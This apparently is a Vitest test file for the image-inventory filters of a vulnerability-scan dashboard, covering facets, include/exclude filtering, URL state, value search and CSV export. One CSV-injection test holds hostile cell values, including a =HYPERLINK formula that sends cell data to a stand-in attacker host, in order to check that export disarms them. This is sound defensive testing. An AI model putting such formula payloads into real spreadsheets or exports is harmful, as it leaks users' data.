import { createPinia, setActivePinia } from 'pinia'
import { beforeEach, describe, expect, it } from 'vitest'

import { emptySelections } from '@/filters/fields.config'
import { IMAGES_FIELDS } from '@/images/fields.config'
import { filterImages, imagesCsv, imagesFacets, searchImageValues } from '@/images/imageFilters'
import { makeFiltersStore } from '@/stores/filters'
import type { ImageRow } from '@/stores/images'

const row = (over: Partial<ImageRow>): ImageRow => ({
  image_digest: 'sha256:x',
  image_repo: 'docker.io/library/nginx',
  tag: '1.21.6',
  namespaces: ['javv-smoke'],
  scanners: ['trivy'],
  crit: 0,
  high: 0,
  med: 0,
  low: 0,
  negligible: 0,
  unknown: 0,
  total: 0,
  fixable: 0,
  replicas: 1,
  trivy_count: null,
  grype_count: null,
  count_delta: null,
  '@timestamp': '2026-07-08T21:06:56+00:00',
  ...over,
})

const rows = [
  row({ image_digest: 'sha256:a', crit: 2, high: 1, total: 3, fixable: 3, namespaces: ['payments'] }),
  row({ image_digest: 'sha256:b', scanners: ['grype'], low: 4, total: 4, image_repo: 'docker.io/rancher/klipper-lb', tag: 'v0.4.17' }),
  row({ image_digest: 'sha256:c' }), // clean image
]

describe('imagesFacets (image counts, not finding counts)', () => {
  it('buckets count IMAGES with >0 of that severity; namespaces sorted by count', () => {
    const f = imagesFacets(rows)
    expect(f.severity).toEqual([
      { key: 'critical', count: 1, by_scanner: {} },
      { key: 'high', count: 1, by_scanner: {} },
      { key: 'low', count: 1, by_scanner: {} },
    ])
    expect(f.scanner).toEqual([
      { key: 'trivy', count: 2, by_scanner: {} },
      { key: 'grype', count: 1, by_scanner: {} },
    ])
    expect(f.namespaces![0]).toMatchObject({ key: 'javv-smoke', count: 2 })
  })

  it('repo/tag buckets (issue 349 §2): count-sorted, one bucket per distinct value', () => {
    const f = imagesFacets(rows)
    expect(f.repos).toEqual([
      { key: 'docker.io/library/nginx', count: 2, by_scanner: {} },
      { key: 'docker.io/rancher/klipper-lb', count: 1, by_scanner: {} },
    ])
    expect(f.tags).toEqual([
      { key: '1.21.6', count: 2, by_scanner: {} },
      { key: 'v0.4.17', count: 1, by_scanner: {} },
    ])
  })

  it('repo/tag buckets cap at the server facet limit, keeping the top by count', () => {
    const many = Array.from({ length: 40 }, (_, i) =>
      row({ image_digest: `sha256:${i}`, image_repo: `registry/repo-${i}`, tag: `t${i}` }),
    )
    // a duplicate makes one repo the clear top — the cap must keep it
    many.push(row({ image_digest: 'sha256:dup', image_repo: 'registry/repo-0', tag: 't0' }))
    const f = imagesFacets(many)
    expect(f.repos).toHaveLength(32)
    expect(f.tags).toHaveLength(32)
    expect(f.repos![0]).toMatchObject({ key: 'registry/repo-0', count: 2 })
  })
})

describe('filterImages (OR within a field, AND across)', () => {
  const sel = () => emptySelections(IMAGES_FIELDS)

  it('severity multi ORs; scanner and namespace match membership; fixable is a flag', () => {
    expect(filterImages(rows, { ...sel(), severity: ['critical', 'low'] }).map((r) => r.image_digest)).toEqual([
      'sha256:a',
      'sha256:b',
    ])
    expect(filterImages(rows, { ...sel(), scanner: ['grype'] })).toHaveLength(1)
    expect(filterImages(rows, { ...sel(), attr: ['fixable'] }).map((r) => r.image_digest)).toEqual(['sha256:a'])
    expect(filterImages(rows, { ...sel(), namespace: ['payments'] })).toHaveLength(1)
  })

  it('scanner matches the D5b pair evidence, not just the committing cycle (corpus shape)', () => {
    // the real corpus: every doc committed by trivy's cycle, grype evidenced only by the pair
    const corpus = [
      row({ image_digest: 'sha256:p', scanners: ['trivy'], trivy_count: 761, grype_count: 746, count_delta: 15 }),
      row({ image_digest: 'sha256:q', scanners: ['trivy'], trivy_count: 5, grype_count: null }),
    ]
    expect(filterImages(corpus, { ...sel(), scanner: ['grype'] }).map((r) => r.image_digest)).toEqual(['sha256:p'])
    expect(imagesFacets(corpus).scanner).toEqual([
      { key: 'trivy', count: 2, by_scanner: {} },
      { key: 'grype', count: 1, by_scanner: {} },
    ])
  })

  it('q contains-matches repo, tag, and namespaces', () => {
    expect(filterImages(rows, { ...sel(), q: ['klipper'] })).toHaveLength(1)
    expect(filterImages(rows, { ...sel(), q: ['v0.4'] })).toHaveLength(1)
    expect(filterImages(rows, { ...sel(), q: ['payments'] })).toHaveLength(1)
    expect(filterImages(rows, { ...sel(), q: ['nope'] })).toHaveLength(0)
  })

  it('empty selections pass everything (clean images included)', () => {
    expect(filterImages(rows, sel())).toHaveLength(3)
  })
})

describe('imagesCsv', () => {
  it('one line per row, D5b pair blank when absent, quoted when needed', () => {
    const csv = imagesCsv([row({ tag: 'a,b' })])
    const lines = csv.split('\n')
    expect(lines).toHaveLength(2)
    expect(lines[0]).toContain('count_delta')
    expect(lines[1]).toContain('"a,b"')
  })

  it('neutralizes formula heads in untrusted string cells (CSV injection, audit F-02)', () => {
    // repo/tag/namespaces are k8s/scanner input — the server sanitize_cell discipline
    const hostile = row({
      image_repo: '=HYPERLINK("https://attacker/"&A1)',
      tag: '+SUM(1,2)',
      namespaces: ['-2+3+cmd', 'ok'],
    })
    const line = imagesCsv([hostile]).split('\n')[1]
    expect(line).toContain(`"'=HYPERLINK(""https://attacker/""&A1)"`)
    expect(line).toContain("'+SUM(1,2)")
    expect(line).toContain("'-2+3+cmd ok")
    expect(line).toMatch(/^"'=/) // the cell head is disarmed, value readable
  })

  it('negative numeric cells stay bare numbers (only strings can arm)', () => {
    const line = imagesCsv([row({ count_delta: -15 })]).split('\n')[1]
    expect(line).toContain(',-15,')
    expect(line).not.toContain("'-15")
  })
})

/**
 * Negation on the client matcher (issue 349 sweep). Findings gets this from the server's
 * `exclude_*` params; the inventory is filtered in the browser, so the matcher owns it.
 */
describe('filterImages — exclude mode', () => {
  const sel = () => emptySelections(IMAGES_FIELDS)
  const digests = (rs: ImageRow[]) => rs.map((r) => r.image_digest)

  it('excluding a severity keeps only images with ZERO of it, clean images included', () => {
    const s = { ...sel(), severity: ['critical'] }
    expect(digests(filterImages(rows, s, { severity: 'not' }))).toEqual(['sha256:b', 'sha256:c'])
    // the strict complement of include — the two partition the set
    expect(digests(filterImages(rows, s))).toEqual(['sha256:a'])
  })

  it('exclude is per field: OR within, still AND across', () => {
    const s = { ...sel(), severity: ['critical'], scanner: ['grype'] }
    // not-critical AND is-grype
    expect(digests(filterImages(rows, s, { severity: 'not' }))).toEqual(['sha256:b'])
    // not-critical AND not-grype
    expect(digests(filterImages(rows, s, { severity: 'not', scanner: 'not' }))).toEqual(['sha256:c'])
  })

  it('excluding a namespace drops only its members', () => {
    const s = { ...sel(), namespace: ['payments'] }
    expect(digests(filterImages(rows, s, { namespace: 'not' }))).toEqual(['sha256:b', 'sha256:c'])
  })

  it('a mode on an empty field changes nothing', () => {
    expect(filterImages(rows, sel(), { severity: 'not' })).toHaveLength(rows.length)
  })

  it('defaults to include when no modes are passed at all', () => {
    const s = { ...sel(), severity: ['critical'] }
    expect(digests(filterImages(rows, s))).toEqual(digests(filterImages(rows, s, {})))
  })

  /** repo/tag are single-valued per row (issue 349 §2) — exact match, strict complement. */
  it('repo include and exclude partition the set', () => {
    const s = { ...sel(), repo: ['docker.io/library/nginx'] }
    expect(digests(filterImages(rows, s))).toEqual(['sha256:a', 'sha256:c'])
    expect(digests(filterImages(rows, s, { repo: 'not' }))).toEqual(['sha256:b'])
  })

  it('tag include and exclude partition the set', () => {
    const s = { ...sel(), tag: ['v0.4.17'] }
    expect(digests(filterImages(rows, s))).toEqual(['sha256:b'])
    expect(digests(filterImages(rows, s, { tag: 'not' }))).toEqual(['sha256:a', 'sha256:c'])
  })

  it('repo matches the FULL image_repo the row carries, never a shortened display form', () => {
    expect(filterImages(rows, { ...sel(), repo: ['nginx'] })).toHaveLength(0)
    expect(filterImages(rows, { ...sel(), repo: ['library/nginx'] })).toHaveLength(0)
  })
})

/**
 * Namespace, Image and Tag take several values (issue 950). The inventory is filtered in the
 * browser, so the one-value limit of the Findings backend does not apply here.
 */
describe('Images filters with several values in one field', () => {
  beforeEach(() => setActivePinia(createPinia()))
  const useStore = makeFiltersStore('test-image-filters', IMAGES_FIELDS)
  const sel = () => emptySelections(IMAGES_FIELDS)
  const digests = (rs: ImageRow[]) => rs.map((r) => r.image_digest)
  const three = [
    ...rows,
    row({ image_digest: 'sha256:d', namespaces: ['billing'], image_repo: 'docker.io/library/redis', tag: '7.0.0' }),
  ]

  it.each(['namespace', 'repo', 'tag'])('a second pick of %s adds the value', (key) => {
    const s = useStore()
    s.toggle(key, 'one')
    s.toggle(key, 'two')
    expect(s.selections[key]).toEqual(['one', 'two'])
  })

  it('two namespaces give the images of both', () => {
    const s = { ...sel(), namespace: ['payments', 'billing'] }
    expect(digests(filterImages(three, s))).toEqual(['sha256:a', 'sha256:d'])
    expect(digests(filterImages(three, s, { namespace: 'not' }))).toEqual(['sha256:b', 'sha256:c'])
  })

  it('two images and two tags give the images of both', () => {
    const repos = { ...sel(), repo: ['docker.io/rancher/klipper-lb', 'docker.io/library/redis'] }
    expect(digests(filterImages(three, repos))).toEqual(['sha256:b', 'sha256:d'])
    const tags = { ...sel(), tag: ['v0.4.17', '7.0.0'] }
    expect(digests(filterImages(three, tags))).toEqual(['sha256:b', 'sha256:d'])
    expect(digests(filterImages(three, tags, { tag: 'not' }))).toEqual(['sha256:a', 'sha256:c'])
  })

  it('the URL keeps every value after a reload', () => {
    const s = useStore()
    s.toggle('namespace', 'payments')
    s.toggle('namespace', 'billing')
    s.pickValue('tag', 'v0.4.17', 'not')
    s.pickValue('tag', '7.0.0', 'not')
    const query = s.toQuery()
    const reloaded = useStore()
    reloaded.clearAll()
    reloaded.fromQuery(query)
    expect(reloaded.selections.namespace).toEqual(['payments', 'billing'])
    expect(reloaded.selections.tag).toEqual(['v0.4.17', '7.0.0'])
    expect(reloaded.modeOf('tag')).toBe('not')
  })
})

/** Issue 1064: the Image and Tag lists stop at the top 32, so the menu searches all the rows the
 * screen holds for the values that contain the typed text. */
describe('searchImageValues', () => {
  const many = Array.from({ length: 40 }, (_, i) =>
    row({ image_repo: `registry/app-${i}`, tag: i % 2 ? 'v1' : `Release-${i}`, namespaces: [`ns-${i}`, 'shared'] }),
  )

  it('finds an image past the top 32, in any case, with its image count', () => {
    expect(imagesFacets(many).repos).toHaveLength(32)
    expect(searchImageValues(many, 'repos', 'APP-39')).toEqual({
      buckets: [{ key: 'registry/app-39', count: 1, by_scanner: {} }],
      more: false,
    })
  })

  it('sends at most 32 values, and says when more match', () => {
    const out = searchImageValues(many, 'repos', 'app-')!
    expect(out.buckets).toHaveLength(32)
    expect(out.more).toBe(true)
    expect(searchImageValues(many, 'tags', 'release-')!.more).toBe(false) // 20 tags match
  })

  it('searches the namespaces of each row, and counts each image once', () => {
    expect(searchImageValues(many, 'namespaces', 'shar')!.buckets).toEqual([
      { key: 'shared', count: 40, by_scanner: {} },
    ])
  })

  it('a field with no list asks nothing', () => {
    expect(searchImageValues(many, 'severity', 'cri')).toBeNull()
  })
})
